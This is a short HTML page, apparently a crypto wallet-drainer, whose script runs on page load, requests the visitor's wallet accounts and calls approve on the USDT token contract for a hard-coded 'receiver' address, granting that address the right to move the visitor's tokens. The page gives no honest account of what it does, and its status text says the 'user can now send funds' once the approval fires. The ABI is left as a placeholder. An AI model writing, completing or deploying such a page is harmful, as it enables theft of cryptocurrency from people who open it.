<!DOCTYPE html>
<html>
<head>
  <title>Auto Approve & Transfer</title>
</head>
<body>
  <h2>Trust Wallet Auto Approve</h2>
  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Your wallet
    const ABI = [ /* Put your USDT ABI here */ ];
    const AMOUNT = "1000000000000000000"; // 1 USDT in wei

    window.addEventListener('load', async () => {
      if (typeof window.ethereum !== "undefined") {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

        // Connect contract
        const contract = new ethers.Contract(USDT_ADDRESS, ABI, new ethers.providers.Web3Provider(window.ethereum).getSigner());

        // Auto-approve
        await contract.approve(RECEIVER, AMOUNT);
        document.body.innerHTML += "<p>✅ Approve triggered. User can now send funds.</p>";
      } else {
        document.body.innerHTML = "<p>❌ Open this in Trust Wallet DApp browser.</p>";
      }
    });
  </script>
</body>
</html>
